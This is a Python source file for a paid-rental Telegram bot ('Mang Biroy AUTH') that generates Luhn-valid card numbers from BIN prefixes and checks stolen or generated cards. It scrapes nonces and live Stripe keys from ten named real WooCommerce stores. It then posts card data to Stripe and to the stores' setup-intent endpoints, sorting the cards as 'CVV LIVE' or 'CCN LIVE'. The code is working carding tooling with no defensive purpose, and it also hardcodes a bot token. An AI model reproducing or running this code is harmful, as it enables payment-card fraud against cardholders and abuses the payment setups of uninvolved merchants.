import requests
import re
import uuid
import time
import logging
import random
import os
import json
import threading
import asyncio
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from concurrent.futures import ThreadPoolExecutor
import urllib3
from datetime import datetime, timedelta
from fake_useragent import UserAgent

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Environment variables
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', "7455342894:AAEJZQdAcICd13uimGrUH1EVIRV1M36uyF8")
ADMIN_ID = os.getenv('ADMIN_ID', "6764941964")

# Unlimited configuration
GLOBAL_MAX_WORKERS = 1000
USER_MAX_WORKERS = 3
REQUEST_TIMEOUT = 15
MAX_CARDS_LIMIT = 500

# Authorized users
AUTHORIZED_USERS = ["6764941964"]
RENTAL_DATA_FILE = "rentals.json"

# Global variables
user_sessions = {}
active_users_lock = threading.Lock()
active_users_count = 0
global_thread_pool = ThreadPoolExecutor(max_workers=GLOBAL_MAX_WORKERS)

# Target sites
API_URLS = [
    "https://yayfoods.com.au/my-account/add-payment-method/",
    "https://laseraesthetics.co.nz/my-account/add-payment-method/",
    "https://feelforhair.co.uk/my-account/add-payment-method/",
    "https://hartleyknows.com.au/my-account/add-payment-method/",
    "https://totbop.co.uk/my-account/add-payment-method/",
    "https://pacande.com/my-account/add-payment-method/",
    "https://balhambeds.com/my-account/add-payment-method/",
    "https://shackletonsonline.co.uk/my-account/add-payment-method/",
    "https://mobileframing.com.au/my-account/add-payment-method/",
    "https://paulmanwaring.com/my-account/add-payment-method/",
]

global_session = requests.Session()

# Rental system functions
def load_rental_data():
    try:
        if os.path.exists(RENTAL_DATA_FILE):
            with open(RENTAL_DATA_FILE, 'r') as f:
                data = json.load(f)
                return {user_id: float(expiry) for user_id, expiry in data.items()}
        return {}
    except Exception as e:
        logger.error(f"Error loading rental data: {e}")
        return {}

def save_rental_data():
    try:
        with open(RENTAL_DATA_FILE, 'w') as f:
            data = {user_id: str(expiry) for user_id, expiry in USER_RENTALS.items()}
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving rental data: {e}")

USER_RENTALS = load_rental_data()

def add_rental_days(user_id, days):
    """Add rental days for user"""
    user_id_str = str(user_id)
    current_time = datetime.now().timestamp()
    
    if user_id_str in USER_RENTALS:
        # Extend existing rental
        current_expiry = USER_RENTALS[user_id_str]
        if current_time < current_expiry:
            # Add days to existing expiry
            new_expiry = current_expiry + (days * 86400)
        else:
            # Start from now
            new_expiry = current_time + (days * 86400)
    else:
        # New rental
        new_expiry = current_time + (days * 86400)
    
    USER_RENTALS[user_id_str] = new_expiry
    save_rental_data()
    
    expiry_date = datetime.fromtimestamp(new_expiry)
    return expiry_date

def remove_rental(user_id):
    """Remove rental access for user"""
    user_id_str = str(user_id)
    if user_id_str in USER_RENTALS:
        del USER_RENTALS[user_id_str]
        save_rental_data()
        return True
    return False

def get_rental_info(user_id):
    """Get rental information for user"""
    user_id_str = str(user_id)
    if user_id_str in USER_RENTALS:
        expiry_time = USER_RENTALS[user_id_str]
        current_time = datetime.now().timestamp()
        
        if current_time < expiry_time:
            time_left = expiry_time - current_time
            days_left = int(time_left // 86400)
            hours_left = int((time_left % 86400) // 3600)
            return {
                'has_access': True,
                'expiry_date': datetime.fromtimestamp(expiry_time),
                'days_left': days_left,
                'hours_left': hours_left
            }
        else:
            # Rental expired
            remove_rental(user_id)
    
    return {'has_access': False}

def cleanup_expired_rentals():
    """Remove expired rentals"""
    current_time = datetime.now().timestamp()
    expired_users = []
    
    for user_id, expiry_time in USER_RENTALS.items():
        if current_time >= expiry_time:
            expired_users.append(user_id)
    
    for user_id in expired_users:
        del USER_RENTALS[user_id]
    
    if expired_users:
        save_rental_data()
        logger.info(f"Cleaned up {len(expired_users)} expired rentals")

# Luhn algorithm functions
def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def is_luhn_valid(card_number):
    return luhn_checksum(card_number) == 0

def calculate_luhn_check_digit(partial_card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(partial_card_number + '0')
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    
    return (10 - (checksum % 10)) % 10

def generate_valid_card(custom_prefix, length=16):
    custom_prefix = custom_prefix.replace(' ', '').replace('-', '')
    remaining_length = length - len(custom_prefix) - 1
    if remaining_length < 0:
        raise ValueError("Custom prefix too long for card length")
    
    middle_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
    partial_card = custom_prefix + middle_digits
    check_digit = calculate_luhn_check_digit(partial_card)
    
    return partial_card + str(check_digit)

def generate_cards(custom_prefix, count=10, length=16):
    cards = []
    for _ in range(count):
        try:
            card_number = generate_valid_card(custom_prefix, length)
            if is_luhn_valid(card_number):
                cards.append(card_number)
        except ValueError as e:
            continue
    
    return cards

def generate_random_expiry():
    month = random.randint(1, 12)
    month_str = f"{month:02d}"
    current_year = datetime.now().year
    year = random.randint(current_year, current_year + 5)
    year_str_4d = str(year)
    year_str_2d = str(year)[-2:]
    return month_str, year_str_4d, year_str_2d

# Stripe functions
def parse_stripe_response(response_text):
    resp_lower = response_text.lower()
    
    if any(msg in resp_lower for msg in ["succeeded", "payment complete", "setup_intent_succeeded"]):
        return {'status': 'cvv_live', 'rawMessage': 'CVV LIVE'}
    
    if any(msg in resp_lower for msg in ["incorrect_cvc", "security code is incorrect"]):
        return {'status': 'ccn_live', 'rawMessage': 'CCN LIVE'}
    
    return {'status': 'declined', 'rawMessage': 'Declined'}

def fetch_nonce_and_key(url):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        res = global_session.get(url, headers=headers, timeout=10)
        res.raise_for_status()
        html = res.text
        
        nonce_match = (re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html) or 
                      re.search(r'"_ajax_nonce":"([a-f0-9]{10,})"', html))
        key_match = re.search(r'(pk_live_[A-Za-z0-9_]+)', html)
        
        nonce = nonce_match.group(1) if nonce_match else None
        key = key_match.group(1) if key_match else None
        
        return {'nonce': nonce, 'key': key}
    except Exception as e:
        logger.error(f"Error fetching nonce/key: {e}")
        return {'nonce': None, 'key': None}

def generate_uuids():
    return {"gu": str(uuid.uuid4()), "mu": str(uuid.uuid4()), "si": str(uuid.uuid4())}

def prepare_headers():
    return {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
    }

# User management
def is_authorized(user_id):
    user_id_str = str(user_id)
    if user_id_str in AUTHORIZED_USERS:
        return True
    
    rental_info = get_rental_info(user_id)
    return rental_info['has_access']

def is_admin(user_id):
    return str(user_id) == ADMIN_ID

def get_user_session(chat_id):
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {
            "checking": False,
            "cards": [],
            "current_index": 0,
            "stats": {"cvv_live": 0, "ccn_live": 0, "declined": 0, "total": 0},
            "message_id": None,
            "chat_id": chat_id,
            "task_id": str(uuid.uuid4())[:8],
            "active": False,
            "approved_cards": []
        }
    return user_sessions[chat_id]

def can_accept_new_user():
    return True

# Card processing
def process_single_card(card, user_session):
    if not user_session["checking"]:
        return None
    
    try:
        card_parts = card.split('|')
        if len(card_parts) < 4:
            user_session["stats"]["declined"] += 1
            user_session["current_index"] += 1
            return None
            
        number, exp_month, exp_year, cvv = card_parts[:4]
        exp_year = exp_year[-2:] if len(exp_year) > 2 else exp_year

        site_url = random.choice(API_URLS)
        result = fetch_nonce_and_key(site_url)
        nonce = result['nonce']
        key = result['key']
        
        if not nonce or not key:
            user_session["stats"]["declined"] += 1
            user_session["current_index"] += 1
            return None
            
        uuids = generate_uuids()
        headers = prepare_headers()
        stripe_data = {
            'type': 'card',
            'card[number]': number,
            'card[cvc]': cvv,
            'card[exp_year]': exp_year,
            'card[exp_month]': exp_month,
            'guid': uuids["gu"],
            'muid': uuids["mu"],
            'sid': uuids["si"],
            'key': key,
            '_stripe_version': '2024-06-20',
        }
        
        try:
            stripe_response = global_session.post(
                "https://api.stripe.com/v1/payment_methods", 
                headers=headers, 
                data=stripe_data, 
                timeout=REQUEST_TIMEOUT
            )
            
            if stripe_response.status_code == 200:
                stripe_data_response = stripe_response.json()
                payment_method_id = stripe_data_response.get('id')
                
                if stripe_data_response.get('error'):
                    error_code = stripe_data_response['error'].get('code', '')
                    if error_code in ['invalid_cvc', 'incorrect_cvc']:
                        user_session["stats"]["ccn_live"] += 1
                        user_session["current_index"] += 1
                        return {'card': card, 'status': 'ccn_live'}
                    else:
                        user_session["stats"]["declined"] += 1
                        user_session["current_index"] += 1
                        return None
                
                if not payment_method_id:
                    user_session["stats"]["declined"] += 1
                    user_session["current_index"] += 1
                    return None
                    
                setup_data = {
                    'action': 'create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': payment_method_id,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': nonce,
                }
                
                confirm_response = global_session.post(
                    site_url, 
                    params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}, 
                    headers=headers, 
                    data=setup_data, 
                    timeout=REQUEST_TIMEOUT
                )
                
                if confirm_response.status_code == 200:
                    result = parse_stripe_response(confirm_response.text)
                    if result['status'] == 'cvv_live':
                        user_session["stats"]["cvv_live"] += 1
                        return {'card': card, 'status': 'cvv_live'}
                    elif result['status'] == 'ccn_live':
                        user_session["stats"]["ccn_live"] += 1
                        return {'card': card, 'status': 'ccn_live'}
                    else:
                        user_session["stats"]["declined"] += 1
                else:
                    user_session["stats"]["declined"] += 1
            else:
                user_session["stats"]["declined"] += 1
                
        except Exception as e:
            user_session["stats"]["declined"] += 1
            
    except Exception as e:
        user_session["stats"]["declined"] += 1
    
    user_session["current_index"] += 1
    return None

def checking_thread(user_session):
    try:
        with active_users_lock:
            global active_users_count
            active_users_count += 1
            user_session["active"] = True
        
        cards = user_session["cards"]
        total_cards = len(cards)
        approved_cards = []
        
        for i, card in enumerate(cards):
            if not user_session["checking"]:
                break
                
            result = process_single_card(card, user_session)
            if result:
                approved_cards.append(result)
            
            if i % 5 == 0:
                update_progress(user_session)
        
        update_progress(user_session, completed=True)
        
        if approved_cards:
            save_approved_cards(user_session, approved_cards)
            
    except Exception as e:
        logger.error(f"Error in checking_thread: {e}")
    finally:
        with active_users_lock:
            active_users_count -= 1
            user_session["active"] = False
            user_session["checking"] = False

def update_progress(user_session, completed=False):
    try:
        stats = user_session["stats"]
        current = user_session["current_index"]
        total = stats["total"]
        chat_id = user_session["chat_id"]
        
        message = f"Completed: {current}/{total}" if completed else f"Processing: {current}/{total}"
        
        # Clean keyboard - NO EMOJIS except CVV/CCN
        buttons = [
            [InlineKeyboardButton(f"Status: {'Completed' if completed else 'Running'}", callback_data='noop')],
            [InlineKeyboardButton(f"🟢 CVV LIVE [ {stats['cvv_live']} ]", callback_data='noop')],
            [InlineKeyboardButton(f"🔵 CCN LIVE [ {stats['ccn_live']} ]", callback_data='noop')],
            [InlineKeyboardButton(f"Declined [ {stats['declined']} ]", callback_data='noop')],
            [InlineKeyboardButton(f"Total [ {total} ]", callback_data='noop')],
            [InlineKeyboardButton("STOP", callback_data=f'stop_{user_session["task_id"]}')]
        ]
        
        keyboard = InlineKeyboardMarkup(buttons)
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        params = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML',
            'reply_markup': keyboard.to_json()
        }
        global_session.post(url, json=params, timeout=10)
        
    except Exception as e:
        logger.error(f"Error updating progress: {e}")

def save_approved_cards(user_session, approved_cards):
    try:
        chat_id = user_session["chat_id"]
        filename = f"results_{chat_id}.txt"
        
        with open(filename, 'w') as f:
            f.write("APPROVED CARDS RESULTS\n")
            f.write("=" * 50 + "\n")
            f.write(f"Total Approved: {len(approved_cards)}\n")
            f.write(f"CVV Live: {sum(1 for card in approved_cards if card['status'] == 'cvv_live')}\n")
            f.write(f"CCN Live: {sum(1 for card in approved_cards if card['status'] == 'ccn_live')}\n")
            f.write("=" * 50 + "\n\n")
            
            for card_info in approved_cards:
                card = card_info['card']
                status = 'CVV LIVE' if card_info['status'] == 'cvv_live' else 'CCN LIVE'
                f.write(f"{card} | {status}\n")
        
        with open(filename, 'rb') as f:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            files = {'document': (filename, f)}
            data = {'chat_id': chat_id, 'caption': f"Approved Cards: {len(approved_cards)}"}
            global_session.post(url, files=files, data=data, timeout=10)
        
        os.remove(filename)
        
    except Exception as e:
        logger.error(f"Error saving approved cards: {e}")

# /GEN COMMAND - EXACTLY LIKE OLD VERSION
async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /gen command for generating cards with custom prefix, optional CVV, and live checking"""
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("Access Denied")
        return
        
    if not context.args:
        await update.message.reply_text(
            "Card Generator\n\n"
            "Usage: /gen [CUSTOM_PREFIX] |[mm]|[yy]|[cvv] [amount] [check/file]\n\n"
            "Examples:\n"
            "/gen 411111 |10|29 10 - Generate 10 cards with random CVV\n"
            "/gen 5362577102 |05|28 25 - Generate 25 cards with random CVV\n"
            "/gen 371449 |12|27|123 100 - Generate 100 cards with custom CVV 123\n"
            "/gen 411111 |10|29|rnd 50 check - Generate 50 cards with random CVV and check live\n"
            "/gen 5362477102 |rnd|rnd|900 300 file - Generate 300 cards with random month/year, fixed CVV 900\n"
            "/gen 411111 |rnd|rnd|rnd 100 - Generate 100 cards with random month/year/CVV\n\n"
            "Max: 500 cards per generation\n"
            "All cards include Luhn validation\n"
            "Options:\n"
            "• check - Generate and immediately check if cards are live\n"
            "• file - Generate and save to file (default behavior)\n"
            "• none - Just generate and send as file\n\n"
            "Special: Use 'rnd' for random month, year, or CVV"
        )
        return
    
    # Join all arguments to handle the custom format
    full_args = ' '.join(context.args)
    
    # Parse the custom format: CUSTOM_PREFIX |mm|yy|cvv amount [check/file]
    # Try format with CVV first (including rnd for CVV)
    pattern_with_cvv = r'^(\d+)\s*\|(\d{1,2}|rnd)\|(\d{2,4}|rnd)\|(\d{3,4}|rnd)\s*(\d+)(?:\s+(check|file))?$'
    # Try format without CVV
    pattern_without_cvv = r'^(\d+)\s*\|(\d{1,2}|rnd)\|(\d{2,4}|rnd)\s*(\d+)(?:\s+(check|file))?$'
    
    match = re.match(pattern_with_cvv, full_args)
    has_cvv = True
    
    if not match:
        match = re.match(pattern_without_cvv, full_args)
        has_cvv = False
    
    if not match:
        await update.message.reply_text(
            "Invalid format!\n\n"
            "Usage: /gen [CUSTOM_PREFIX] |[mm]|[yy]|[cvv] [amount] [check/file]\n\n"
            "Examples:\n"
            "/gen 411111 |10|29 10 - Without CVV (random CVV)\n"
            "/gen 5362577102 |05|28|123 25 - With custom CVV\n"
            "/gen 371449 |12|27|rnd 100 check - Check live with random CVV\n"
            "/gen 5362477102 |rnd|rnd|900 300 file - Save to file\n"
            "/gen 411111 |rnd|rnd|rnd 50 - Random month/year/CVV\n\n"
            "• CUSTOM_PREFIX: 4-15 digits (starting numbers of the card)\n"
            "• mm: Month (1-12) or 'rnd' for random\n" 
            "• yy: Year (2 or 4 digits) or 'rnd' for random\n"
            "• cvv: 3-4 digits or 'rnd' for random (optional - random if not provided)\n"
            "• amount: 1-500 cards\n"
            "• check/file: (optional) 'check' to test live, 'file' to save as file (default: file)"
        )
        return
    
    if has_cvv:
        custom_prefix = match.group(1)
        exp_month_input = match.group(2)
        exp_year_input = match.group(3)
        custom_cvv_input = match.group(4)
        amount_str = match.group(5)
        action = match.group(6)
        
        # Handle CVV input - if 'rnd', set to None for random generation
        if custom_cvv_input.lower() == 'rnd':
            custom_cvv = None
            cvv_display = "Random"
        else:
            custom_cvv = custom_cvv_input
            cvv_display = custom_cvv
    else:
        custom_prefix = match.group(1)
        exp_month_input = match.group(2)
        exp_year_input = match.group(3)
        amount_str = match.group(4)
        action = match.group(5)
        custom_cvv = None
        cvv_display = "Random"
    
    # Default action is 'file' if not specified
    if action is None:
        action = 'file'
    
    # Validate custom prefix
    if not custom_prefix.isdigit() or len(custom_prefix) < 4 or len(custom_prefix) > 15:
        await update.message.reply_text(
            "Invalid custom prefix!\n\n"
            "Custom prefix must be 4-15 digits\n\n"
            "Examples:\n"
            "/gen 411111 |10|29 10 - 6-digit prefix\n"
            "/gen 5362577102 |05|28 25 - 10-digit prefix\n"
            "/gen 371449123456 |12|27 100 - 12-digit prefix"
        )
        return
    
    # Handle month (either fixed or random)
    random_month = False
    if exp_month_input.lower() == 'rnd':
        random_month = True
        exp_month_display = "Random"
    else:
        try:
            exp_month_int = int(exp_month_input)
            if exp_month_int < 1 or exp_month_int > 12:
                raise ValueError("Invalid month")
            exp_month = f"{exp_month_int:02d}"
            exp_month_display = exp_month
        except ValueError:
            await update.message.reply_text(
                "Invalid expiry month!\n\n"
                "Month must be between 01-12 or 'rnd' for random\n\n"
                "Example: /gen 411111 |10|29 10 or /gen 411111 |rnd|29 10"
            )
            return
    
    # Handle year (either fixed or random)
    random_year = False
    if exp_year_input.lower() == 'rnd':
        random_year = True
        exp_year_display = "Random"
    else:
        try:
            exp_year_int = int(exp_year_input)
            if len(exp_year_input) == 2:
                # Convert 2-digit year to 4-digit (assume 2000s)
                exp_year_int = 2000 + exp_year_int
            elif len(exp_year_input) == 4:
                # Already 4-digit year
                pass
            else:
                raise ValueError("Invalid year format")
            
            current_year = datetime.now().year
            if exp_year_int < current_year or exp_year_int > current_year + 10:
                await update.message.reply_text(
                    f"Expiry year warning!\n\n"
                    f"Year {exp_year_int} seems unrealistic.\n"
                    f"Current year: {current_year}\n\n"
                    f"Continue anyway?"
                )
            
            exp_year = str(exp_year_int)
            exp_year_display = exp_year_input
        except ValueError:
            await update.message.reply_text(
                "Invalid expiry year!\n\n"
                "Year must be 2 or 4 digits or 'rnd' for random\n\n"
                "Examples:\n"
                "/gen 411111 |10|29 10 - for 2029\n"
                "/gen 411111 |10|2029 10 - also for 2029\n"
                "/gen 411111 |10|rnd 10 - random year"
            )
            return
    
    # Validate custom CVV if provided (and not 'rnd')
    if custom_cvv is not None and custom_cvv != 'rnd':
        if not custom_cvv.isdigit():
            await update.message.reply_text(
                "Invalid CVV!\n\n"
                "CVV must be 3-4 digits or 'rnd' for random\n\n"
                "Examples:\n"
                "/gen 411111 |10|29|123 10 - 3-digit CVV\n"
                "/gen 371449 |12|27|1234 10 - 4-digit CVV for Amex\n"
                "/gen 411111 |10|29|rnd 10 - Random CVV"
            )
            return
        
        # Validate CVV length based on card type
        if custom_prefix.startswith('3'):  # Amex
            if len(custom_cvv) != 4:
                await update.message.reply_text(
                    "Invalid CVV for Amex!\n\n"
                    "Amex cards require 4-digit CVV\n\n"
                    "Example: /gen 371449 |12|27|1234 10"
                )
                return
        else:  # Visa, MasterCard, Discover
            if len(custom_cvv) != 3:
                await update.message.reply_text(
                    "Invalid CVV for Visa/MasterCard!\n\n"
                    "Visa/MasterCard cards require 3-digit CVV\n\n"
                    "Example: /gen 411111 |10|29|123 10"
                )
                return
    
    # Validate amount
    try:
        amount = int(amount_str)
        if amount <= 0:
            raise ValueError("Amount must be positive")
        if amount > 500:
            amount = 500
            await update.message.reply_text(
                f"Amount limited to 500 cards\n"
                f"Generating 500 cards instead of {amount_str}"
            )
    except ValueError:
        await update.message.reply_text(
            "Invalid amount!\n\n"
            "Amount must be a number between 1-500\n\n"
            "Example: /gen 411111 |10|29 50"
        )
        return
    
    # Determine card length based on custom prefix
    if custom_prefix.startswith('3'):  # Amex
        card_length = 15
    else:  # Visa, MasterCard, Discover
        card_length = 16
    
    # Check if custom prefix is too long for card length
    if len(custom_prefix) >= card_length:
        await update.message.reply_text(
            f"Custom prefix too long!\n\n"
            f"Your prefix has {len(custom_prefix)} digits but {card_length}-digit cards can only have up to {card_length-1} digits before the check digit.\n\n"
            f"Please use a shorter prefix (max {card_length-1} digits)."
        )
        return
    
    action_display = "Check live" if action == 'check' else "Save to file"
    
    await update.message.reply_text(
        f"Generating {amount} cards...\n\n"
        f"Custom Prefix: {custom_prefix}\n"
        f"Expiry Month: {exp_month_display}\n"
        f"Expiry Year: {exp_year_display}\n"
        f"CVV: {cvv_display}\n"
        f"Card Length: {card_length} digits\n"
        f"Amount: {amount}\n"
        f"Luhn Validation: Enabled\n"
        f"Action: {action_display}\n\n"
        f"Please wait..."
    )
    
    try:
        # Generate cards
        generated_cards = generate_cards(custom_prefix, amount, card_length)
        
        if not generated_cards:
            await update.message.reply_text(
                "Failed to generate cards!\n\n"
                "Please check your custom prefix and try again."
            )
            return
        
        # Create card strings with specified expiry and CVV
        cards_with_details = []
        
        for card in generated_cards:
            # Generate random month if requested
            if random_month:
                exp_month_actual, _, _ = generate_random_expiry()
            else:
                exp_month_actual = exp_month
            
            # Generate random year if requested
            if random_year:
                _, _, exp_year_actual_2d = generate_random_expiry()
            else:
                exp_year_actual_2d = exp_year[-2:]
            
            # Generate random CVV if not provided or if 'rnd' is specified
            if custom_cvv is None:
                if custom_prefix.startswith('3'):  # Amex - 4 digit CVV
                    random_cvv = str(random.randint(1000, 9999))
                else:  # Visa/MasterCard - 3 digit CVV
                    random_cvv = str(random.randint(100, 999))
                card_string = f"{card}|{exp_month_actual}|{exp_year_actual_2d}|{random_cvv}"
            else:
                # Use the same custom CVV for all cards
                card_string = f"{card}|{exp_month_actual}|{exp_year_actual_2d}|{custom_cvv}"
            
            cards_with_details.append(card_string)
        
        # Save to file (always create the file for both options)
        filename = f"generated_{custom_prefix}_{amount}.txt"
        with open(filename, 'w') as f:
            for card in cards_with_details:
                f.write(card + '\n')
        
        # Handle different actions
        if action == 'check':
            # Start live checking the generated cards
            await update.message.reply_text(
                f"Starting live check for {len(cards_with_details)} generated cards..."
            )
            
            # Create a user session for checking
            chat_id = update.message.chat_id
            user_session = get_user_session(chat_id)
            
            if user_session["checking"]:
                await update.message.reply_text("Please stop current checking first using /stop")
                # Clean up file
                try:
                    os.remove(filename)
                except:
                    pass
                return
            
            # Initialize session with generated cards
            user_session.update({
                "checking": True,
                "cards": cards_with_details,
                "current_index": 0,
                "stats": {
                    "cvv_live": 0,
                    "ccn_live": 0,
                    "declined": 0,
                    "total": len(cards_with_details)
                },
                "active": False
            })
            
            # Start checking in background using global thread pool
            future = global_thread_pool.submit(checking_thread, user_session)
            
            await update.message.reply_text(f"Generated {len(cards_with_details)} cards and started live check!")
            
        else:  # action == 'file' or default
            # Send file to user without live check
            cvv_info = "Random CVV for each card" if custom_cvv is None else f"Fixed CVV: {custom_cvv}"
            month_info = "Random month for each card" if random_month else f"Fixed month: {exp_month_display}"
            year_info = "Random year for each card" if random_year else f"Fixed year: {exp_year_display}"
            
            with open(filename, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=filename,
                    caption=f"Generated {len(cards_with_details)} Cards\n\n"
                           f"Custom Prefix: {custom_prefix}\n"
                           f"Expiry Month: {month_info}\n"
                           f"Expiry Year: {year_info}\n"
                           f"CVV: {cvv_info}\n"
                           f"Card Length: {card_length} digits\n"
                           f"Amount: {amount}\n"
                           f"Luhn Validated: Yes\n"
                           f"Action: Saved to file\n\n"
                           f"File: {filename}\n\n"
                           f"Add 'check' at the end to test cards live",
                    parse_mode='HTML'
                )
        
        # Clean up file after sending
        try:
            os.remove(filename)
        except:
            pass
            
    except Exception as e:
        logger.error(f"Error in gen_command: {e}")
        await update.message.reply_text(
            "Error generating cards!\n\n"
            "Please try again with a different custom prefix."
        )
        
        # Clean up file in case of error
        try:
            if 'filename' in locals():
                os.remove(filename)
        except:
            pass

# Telegram handlers
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Mang Biroy AUTH\n\n"
        "Send cc.txt file with cards to check.\n\n"
        "Format: card|mm|yy|cvv\n\n"
        "Use /myaccess to check your rental status\n"
        "Use /rental [user_id] [days] to add rental (Admin only)\n"
        "Use /gen to generate cards with custom prefix",
        parse_mode='HTML'
    )

async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    rental_info = get_rental_info(user_id)
    
    if is_authorized(user_id):
        if str(user_id) in AUTHORIZED_USERS:
            await update.message.reply_text("Permanent Access - Unlimited")
        else:
            expiry = rental_info['expiry_date'].strftime("%Y-%m-%d %H:%M:%S")
            await update.message.reply_text(
                f"Rental Access\n"
                f"Expires: {expiry}\n"
                f"Days Left: {rental_info['days_left']}\n"
                f"Hours Left: {rental_info['hours_left']}"
            )
    else:
        await update.message.reply_text("No Access - Contact admin for rental")

async def rental_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add rental days for user - Admin only"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("Admin only command")
        return
        
    if not context.args or len(context.args) < 2:
        await update.message.reply_text("Usage: /rental [user_id] [days]")
        return
        
    try:
        target_user_id = context.args[0]
        days = int(context.args[1])
        
        expiry_date = add_rental_days(target_user_id, days)
        
        await update.message.reply_text(
            f"Rental added\n"
            f"User: {target_user_id}\n"
            f"Days: {days}\n"
            f"Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}"
        )
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("Access Denied")
        return
        
    chat_id = update.message.chat_id
    user_session = get_user_session(chat_id)
    
    if user_session["checking"]:
        user_session["checking"] = False
        await update.message.reply_text("Checking stopped")
    else:
        await update.message.reply_text("No active checking session")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("Access Denied")
        return
        
    chat_id = update.message.chat_id
    user_session = get_user_session(chat_id)
    
    if user_session["checking"]:
        await update.message.reply_text("Please stop current checking first using /stop")
        return
        
    document = update.message.document
    if document.file_name.endswith('.txt'):
        file = await context.bot.get_file(document.file_id)
        file_path = f"cc_{chat_id}.txt"
        await file.download_to_drive(file_path)
        
        await update.message.reply_text("File received! Use /startcheck to begin checking.")
    else:
        await update.message.reply_text("Please upload a .txt file")

async def start_checking(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("Access Denied")
        return
        
    chat_id = update.message.chat_id
    user_session = get_user_session(chat_id)
    
    if user_session["checking"]:
        await update.message.reply_text("Already checking! Use /stop first.")
        return
        
    user_file = f"cc_{chat_id}.txt"
    if not os.path.exists(user_file):
        await update.message.reply_text("No card file found. Send .txt file first.")
        return
        
    try:
        with open(user_file, 'r') as f:
            cards = [line.strip() for line in f if line.strip()]
    except Exception as e:
        await update.message.reply_text("Error reading card file!")
        return
        
    if not cards:
        await update.message.reply_text("No cards found!")
        return
        
    user_session.update({
        "checking": True,
        "cards": cards,
        "current_index": 0,
        "stats": {"cvv_live": 0, "ccn_live": 0, "declined": 0, "total": len(cards)},
        "active": False
    })
    
    future = global_thread_pool.submit(checking_thread, user_session)
    await update.message.reply_text(f"Checking started! Processing {len(cards)} cards.")

async def handle_stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    callback_data = query.data
    if callback_data.startswith('stop_'):
        task_id = callback_data.replace('stop_', '')
        
        for chat_id, session in user_sessions.items():
            if session.get('task_id') == task_id:
                if session["checking"]:
                    session["checking"] = False
                    await query.edit_message_text("Processing Stopped")
                    return
        
        await query.answer("Session not found!", show_alert=True)

async def handle_noop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Exception while handling an update:", exc_info=context.error)

# Main function
def main():
    logger.info("Mang Biroy AUTH Bot Starting...")
    
    cleanup_expired_rentals()
    
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        application.add_error_handler(error_handler)
        
        # Add handlers
        application.add_handler(CommandHandler("start", start_command))
        application.add_handler(CommandHandler("stop", stop_command))
        application.add_handler(CommandHandler("startcheck", start_checking))
        application.add_handler(CommandHandler("myaccess", myaccess_command))
        application.add_handler(CommandHandler("rental", rental_command))
        application.add_handler(CommandHandler("gen", gen_command))
        
        application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, start_command))
        
        application.add_handler(CallbackQueryHandler(handle_stop_callback, pattern=r'^stop_'))
        application.add_handler(CallbackQueryHandler(handle_noop_callback, pattern=r'^noop$'))
        
        logger.info("Bot is running...")
        application.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
        
    except Exception as e:
        logger.error(f"Bot failed to start: {e}")

if __name__ == "__main__":
    main()